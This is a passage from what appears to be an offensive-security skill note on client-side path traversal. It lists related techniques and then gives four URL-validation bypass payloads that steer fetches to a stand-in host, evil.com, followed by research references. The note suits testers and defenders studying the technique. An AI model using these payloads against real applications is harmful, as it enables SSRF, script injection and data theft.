- parser-differential-bypass -- different layers parse the same URL differently
- nextjs-cache-poisoning -- poison Next.js cache to serve traversed responses
- ssrf-redirect-loop -- chain with secondary context traversal for SSRF escalation

## URL Validation Bypass (for CSPT through validated fetch URLs)

When the SPA validates the constructed URL before fetching (e.g. allowlisted hosts), combine CSPT traversal with URL validation bypasses:

```
# Userinfo confusion
fetch("/api/" + param)  ->  param = "../../evil.com%23@allowed.com"

# Backslash confusion
param = "..%5C..%5Cevil.com"

# Fragment injection
param = "../../evil.com%23@allowed.com/payload"

# Scheme-relative
param = "../..//evil.com/xss.json"
```

See `ssrf-ip-filter-bypass` skill for the full URL validation bypass matrix.

## Reference

- https://lab.ctbb.show/research/the-dot-dot-slash-that-frameworks-hand-you (xssdoctor/Jonathan Dunn -- framework-level source code analysis of all 8 routers, Apr 2026)
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-168-client-side-path-traversals-across-every-framework-with-xssdoctor
- https://vitorfalcao.com/posts/hacking-high-profile-targets/
- https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/
- https://octagon.net/blog/2022/01/11/client-side-path-manipulation/
- https://url.spec.whatwg.org/#url-parsing (WHATWG URL spec -- tab/newline stripping)
